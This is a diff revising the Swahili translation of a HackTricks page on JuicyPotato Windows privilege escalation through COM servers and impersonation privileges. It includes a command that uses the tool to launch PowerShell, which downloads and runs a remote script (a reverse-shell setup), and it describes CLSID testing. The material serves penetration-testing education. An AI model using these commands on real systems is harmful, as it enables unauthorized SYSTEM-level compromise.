@@ -4,7 +4,7 @@
 
 <summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalamu wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -12,13 +12,13 @@
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **programu hasidi za wizi**.
+[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za wizi**.
 
-Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na programu hasidi za wizi wa habari.
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na malware za kuiba habari.
 
 Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** kwa:
 
@@ -42,19 +42,19 @@ _To leo tamu la_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotato
 
 ### Muhtasari <a href="#summary" id="summary"></a>
 
-[Kutoka kwa SomaMe ya juicy-potato](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
+[**Kutoka kwa Soma juicypotato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [toleo lake](https://github.com/decoder-it/lonelypotato) linatumia mnyororo wa kupandisha mamlaka kulingana na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na mamlaka ya `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa ujenzi wa Windows tuligundua usanidi ambapo `BITS` ulizuiliwa kwa makusudi na bandari `6666` ilichukuliwa.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) na [toleo lake](https://github.com/decoder-it/lonelypotato) linatumia mnyororo wa kupandisha mamlaka kulingana na [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [huduma](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) ikiwa na msikilizaji wa MiTM kwenye `127.0.0.1:6666` na unapokuwa na mamlaka ya `SeImpersonate` au `SeAssignPrimaryToken`. Wakati wa ukaguzi wa ujenzi wa Windows tuligundua usanidi ambapo `BITS` ulizimwa kwa makusudi na bandari `6666` ilichukuliwa.
 
-Tuliamua kuwezesha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema habari njema kwa Juicy Potato**.
+Tuliamua kuwezesha [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Sema habari kwa Juicy Potato**.
 
 > Kwa nadharia, angalia [Rotten Potato - Kupandisha Mamlaka kutoka kwa Akaunti za Huduma hadi SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) na fuata mnyororo wa viungo na marejeo.
 
-Tuligundua kwamba, zaidi ya `BITS` kuna seva kadhaa za COM tunaweza kutumia vibaya. Wanahitaji tu:
+Tuligundua kwamba, mbali na `BITS` kuna seva za COM kadhaa tunaweza kutumia vibaya. Wanahitaji tu:
 
 1. iweze kuanzishwa na mtumiaji wa sasa, kawaida "mtumiaji wa huduma" ambaye ana mamlaka ya udanganyifu
 2. tekeleza kiolesura cha `IMarshal`
-3. kufanya kazi kama mtumiaji aliyeinuliwa (SYSTEM, Msimamizi, …)
+3. iweze kukimbia kama mtumiaji aliyeinuliwa (SYSTEM, Msimamizi, …)
 
 Baada ya majaribio tulipata na kujaribu orodha ndefu ya [CLSID's za kuvutia](http://ohpe.it/juicy-potato/CLSID/) kwenye toleo kadhaa za Windows.
 
@@ -99,7 +99,7 @@ Ikiwa mtumiaji ana ruhusa za `SeImpersonate` au `SeAssignPrimaryToken` basi wewe
 
 Ni karibu haiwezekani kuzuia matumizi mabaya ya seva zote hizi za COM. Unaweza kufikiria kuhusu kubadilisha ruhusa za vitu hivi kupitia `DCOMCNFG` lakini kila la heri, hii itakuwa changamoto.
 
-Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinaendeshwa chini ya akaunti za `* SERVICE`. Kusitisha `DCOM` bila shaka kungezuia shambulio hili lakini kunaweza kuwa na athari kubwa kwa OS inayohusika.
+Suluhisho halisi ni kulinda akaunti na programu nyeti ambazo zinaendeshwa chini ya akaunti za `* SERVICE`. Kusitisha `DCOM` bila shaka itazuia shambulio hili lakini inaweza kuwa na athari kubwa kwa OS inayohusika.
 
 Kutoka: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
@@ -121,10 +121,6 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 c:\Users\Public>
 ```
 ### Powershell rev
-
-### Powershell rev
-
-### Powershell rev
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
@@ -134,7 +130,7 @@ c:\Users\Public>
 
 ## Matatizo ya CLSID
 
-Maranyingi, CLSID ya msingi ambayo JuicyPotato hutumia **haifanyi kazi** na jaribio linashindwa. Kawaida, inachukua majaribio mengi kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo wa uendeshaji fulani, unapaswa kutembelea ukurasa huu:
+Maranyingi, CLSID ya msingi ambayo JuicyPotato hutumia **haifanyi kazi** na shambulio linashindwa. Kawaida, inachukua majaribio mengi kupata **CLSID inayofanya kazi**. Ili kupata orodha ya CLSIDs za kujaribu kwa mfumo wa uendeshaji fulani, unapaswa kutembelea ukurasa huu:
 
 {% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
 
@@ -142,7 +138,7 @@ Maranyingi, CLSID ya msingi ambayo JuicyPotato hutumia **haifanyi kazi** na jari
 
 Kwanza, utahitaji baadhi ya programu za kutekeleza mbali na juicypotato.exe.
 
-Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na upakie kwenye kikao chako cha PS, na pakua na tekeleza [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs inayoweza kujaribiwa.
+Pakua [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) na upakie kwenye kikao chako cha PS, na pakua na tekeleza [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Skripti hiyo itaunda orodha ya CLSIDs inayowezekana kujaribu.
 
 Kisha pakua [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(badilisha njia ya orodha ya CLSID na kwa kutekelezeka kwa juicypotato) na tekeleza. Itaanza kujaribu kila CLSID, na **wakati nambari ya bandari inabadilika, itamaanisha kwamba CLSID imefanya kazi**.
 
@@ -152,26 +148,26 @@ Kisha pakua [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/
 
 * [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** za kuangalia ikiwa kampuni au wateja wake wameathiriwa na **malware za wizi**.
+[**WhiteIntel**](https://whiteintel.io) ni injini ya utaftaji inayotumia **dark-web** ambayo inatoa huduma za **bure** kuchunguza ikiwa kampuni au wateja wake wameathiriwa na **programu hasidi za kuiba**.
 
-Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na programu hasidi za kuiba habari.
+Lengo kuu la WhiteIntel ni kupambana na utekaji wa akaunti na mashambulio ya ransomware yanayotokana na programu hasidi za kuiba taarifa.
 
-Unaweza kutembelea tovuti yao na kujaribu injini yao kwa **bure** kwenye:
+Unaweza kutembelea tovuti yao na kujaribu injini yao **bure** hapa:
 
 {% embed url="https://whiteintel.io" %}
 
 <details>
 
-<summary><strong>Jifunze kuhusu kuvamia AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Je, unafanya kazi katika kampuni ya **usalama wa mtandao**? Je, unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Je, unafanya kazi katika kampuni ya **usalama wa mtandao**? Je, unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
